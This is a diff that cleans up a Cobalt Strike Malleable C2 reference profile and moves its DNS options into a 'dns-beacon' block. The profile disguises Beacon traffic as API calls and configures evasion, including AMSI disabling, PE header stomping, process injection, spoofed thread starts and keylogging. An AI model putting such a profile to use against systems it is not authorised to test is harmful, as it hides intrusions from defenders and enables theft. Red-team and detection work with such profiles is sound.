@@ -1,22 +1,15 @@
-#This profile is meant to show all of the options available in Malleable C2
+# This profile is meant to show all of the options available in Malleable C2
 
-
-#Various options
+# Various options
 
 # Append random-length string (up to data_jitter value) to http-get and http-post server output
 
 set sample_name "Test Profile";
 set data_jitter "0";
-set dns_idle "0.0.0.0";
-set dns_max_txt "252";
-set dns_sleep "0";
 set dns_stager_prepend "";
-set dns_stager_subhost ".stage.123456.";
-set dns_ttl "1";
 set host_stage "true"; #Host payload for staging over set, setS, or DNS. Required by stagers.
 set jitter "0";
-set maxdns "255";
-set pipename "msagent_###"; #Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.
+set pipename "msagent_###"; #Default name of pipe to use for SMB Beacon's peer-to-peer communication. Each # is replaced with a random hex value.
 set pipename_stager "status_##";
 set sleeptime "60000"; #def sleep in ms
 set smb_frame_header "";
@@ -34,34 +27,49 @@ http-config {
     header "Keep-Alive""timeout=5, max=100";
     header "Connection""Keep-Alive";
 
-#   The set trust_x_forwarded_foroption decides if Cobalt Strike uses the 
-# X-Forwarded-For set header to determine the remote address of a request. 
-# Use this option if your Cobalt Strike server is behind an set redirector    
+    # The set trust_x_forwarded_foroption decides if Cobalt Strike uses the 
+    # X-Forwarded-For set header to determine the remote address of a request. 
+    # Use this option if your Cobalt Strike server is behind an set redirector    
     set trust_x_forwarded_for "true";
-
-    
-
 }
 
+dns-beacon {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle "0.0.0.0";
+    set dns_max_txt "252";
+    set dns_sleep "0";
+    set dns_ttl "5";
+    set maxdns "200";
+    set dns_stager_prepend "doc-stg-prepend";
+    set dns_stager_subhost "doc-stg-sh.";
+
+    # DNS subhost override options added in 4.3:
+    set beacon "doc.bc.";
+    set get_A "doc.1a.";
+    set get_AAAA "doc.4a.";
+    set get_TXT "doc.tx.";
+    set put_metadata "doc.md.";
+    set put_output "doc.po.";
+    set ns_response "zero";
+}
 
 
 https-certificate {
-    set C "US"; #Country
-    set CN "localhost"; # CN - you will probably nver use this, but don't leave at localost
-    set L "San Francisco"; #Locality
-    set OU "IT Services"; #Org unit
-    set O "FooCorp"; #Org name
-    set ST "CA"; #State
+    set C "US"; # Country
+    set CN "localhost"; # CN - you will probably never use this, but don't leave at localhost
+    set L "San Francisco"; # Locality
+    set OU "IT Services"; # Org unit
+    set O "FooCorp"; # Org name
+    set ST "CA"; # State
     set validity "365";
 
-    # if using a valid vert, specify this, keystore = java keystore
-    #set keystore "domain.store";
-    #set password "mypassword";
-
+    # If using a valid vert, specify this, keystore = java keystore
+    # set keystore "domain.store";
+    # set password "mypassword";
 }
 
 
-#If you have code signing cert:
+# If you have code signing cert:
 #code-signer {
 #    set keystore "keystore.jks";
 #    set password "password";
@@ -71,8 +79,7 @@ https-certificate {
 #}
 
 
-
-#Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
+# Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
 http-stager {
     set uri_x86 "/api/v1/GetLicence";     
     set uri_x64 "/api/v2/GetLicence";
@@ -94,20 +101,20 @@ http-stager {
 }
 
 
-#This is used only in http-get and http-post and not during stage
+# This is used only in http-get and http-post and not during stage
 set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
 
-# define indicators for an set GET
+# Define indicators for an set GET
 http-get {
-	# we require a stub URI to attach the rest of our data to.
+	# We require a stub URI to attach the rest of our data to.
 	set uri "/api/v1/Updates";
 
 	client {
 
         header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
-		# mask our metadata, base64 encode it, store it in the URI
-		metadata {
 
+		# Mask our metadata, base64 encode it, store it in the URI
+		metadata {
 
             # XOR encode the value
 			mask;
@@ -118,10 +125,10 @@ http-get {
             # URL-safe Base64 Encode
 			base64;
 
-            # NetBIOS Encode ‘a’ ?
+            # NetBIOS Encode 'a' ?
             #netbios;
 
-            #NetBIOS Encode ‘A’
+            # NetBIOS Encode 'A'
             #netbiosu;
 
             # You probably want these to be last two, else you will encode these values
@@ -137,24 +144,21 @@ http-get {
             # Append to URI
 			#uri-append;
 
-
-            
-            #Set in a header
+            # Set in a header
             header "Cookie";
 
-            #Send data as transaction body
+            # Send data as transaction body
             #print
 
-            #Store data in a URI parameter
+            # Store data in a URI parameter
             #parameter "someparam"
-
 		}
 	}
 
 	server {
 		header "Content-Type" "application/octet-stream";
         header "Content-Encoding" "gzip";
-		# prepend some text in case the GET is empty.
+		# Prepend some text in case the GET is empty.
 		output {
 			mask;
 			base64;
@@ -165,17 +169,17 @@ http-get {
 	}
 }
 
-# define indicators for an set POST
+# Define indicators for an set POST
 http-post {
 	set uri "/api/v1/Telemetry/Id/";
 	set verb "POST";
 
 	client {
-		# make it look like we're posting something cool.
+		# Make it look like we're posting something cool.
 		header "Content-Type" "application/json";
         header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
 
-		# ugh, our data has to go somewhere!
+		# Ugh, our data has to go somewhere!
 		output {
 
 			mask;
@@ -183,7 +187,7 @@ http-post {
 			uri-append;
 		}
 
-		# randomize and post our session ID
+		# Randomize and post our session ID
 		id {
 			mask;
 			base64url;
@@ -207,24 +211,20 @@ http-post {
             append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
 			print;
 		}
-
-        
 	}
 }
 
 
 stage {
-    
-
-#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s
-# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
+    # The transform-x86 and transform-x64 blocks pad and transform Beacon’s
+    # Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
     transform-x86 {
         prepend "\x90\x90";
         strrep "ReflectiveLoader" "DoLegitStuff";
     }
     
     transform-x64 {
-        # transform the x64 rDLL stage, same options as with 
+        # Transform the x64 rDLL stage, same options as with 
     }
     stringw "I am not Beacon";
 
@@ -247,7 +247,7 @@ stage {
     #set module_x86 "xpsservices.dll";
     #set module_x64 "xpsservices.dll";
 
-    # Obfuscate the Reflective DLL’s import table, overwrite unused header content, 
+    # Obfuscate the Reflective DLL's import table, overwrite unused header content, 
     # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
     set obfuscate "false"; 
 
@@ -261,7 +261,6 @@ stage {
     # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after 
     # it loads Beacon payload
     set stomppe "true";
-
 
     # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
     set userwx "false";
@@ -279,6 +278,7 @@ stage {
 
     #TODO: add examples process-inject 
 }
+
 process-inject {
         # set how memory is allocated in a remote process
         # VirtualAllocEx or NtMapViewOfSection. The
@@ -286,7 +286,7 @@ process-inject {
         # VirtualAllocEx is always used for cross-arch memory allocations.
 
         set allocator "VirtualAllocEx";
-        # shape the memory characteristics and content
+        # Shape the memory characteristics and content
         set min_alloc "16384";
         set startrwx "true";
         set userwx "false";
@@ -294,39 +294,36 @@ process-inject {
         prepend "\x90\x90";
         }
         transform-x64 {
-        # transform x64 injected content
+        # Transform x64 injected content
         }
-        # determine how to execute the injected code
+        # Determine how to execute the injected code
         execute {
             CreateThread "ntdll.dll!RtlUserThreadStart";
             SetThreadContext;
             RtlCreateUserThread;
         }
 }
+
 post-ex {
-    # control the temporary process we spawn to
+    # Control the temporary process we spawn to
     set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
     set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
-    # change the permissions and content of our post-ex DLLs
+    # Change the permissions and content of our post-ex DLLs
     set obfuscate "true";
-    # change our post-ex output named pipe names...
+    # Change our post-ex output named pipe names...
     set pipename "msrpc_####, win\\msrpc_##";
-    # pass key function pointers from Beacon to its child jobs
+    # Pass key function pointers from Beacon to its child jobs
     set smartinject "true";
-    # disable AMSI in powerpick, execute-assembly, and psinject
+    # Disable AMSI in powerpick, execute-assembly, and psinject
     set amsi_disable "true";
 
-
-    #The thread_hint option allows multi-threaded post-ex DLLs to spawn 
+    # The thread_hint option allows multi-threaded post-ex DLLs to spawn 
     # threads with a spoofed start address. Specify the thread hint as 
-    # “module!function+0x##” to specify the start address to spoof. 
+    # "module!function+0x##" to specify the start address to spoof. 
     # The optional 0x## part is an offset added to the start address.
     # set thread_hint "....TODO:FIXME"
 
     # options are: GetAsyncKeyState (def) or SetWindowsHookEx
     set keylogger "GetAsyncKeyState";
 }
-
-
-
 
